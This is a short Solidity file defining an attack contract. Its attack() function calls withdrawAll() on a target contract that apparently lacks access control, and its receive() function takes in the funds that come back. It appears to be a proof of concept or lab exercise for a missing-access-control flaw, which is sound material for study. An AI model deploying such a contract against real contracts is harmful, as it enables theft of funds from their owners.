// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IAccessControl {
    function withdrawAll() external;
}

contract AccessControlAttack {
    IAccessControl public target;

    constructor(address _target) {
        target = IAccessControl(_target);
    }

    function attack() public {
        target.withdrawAll();
    }

    receive() external payable {}
}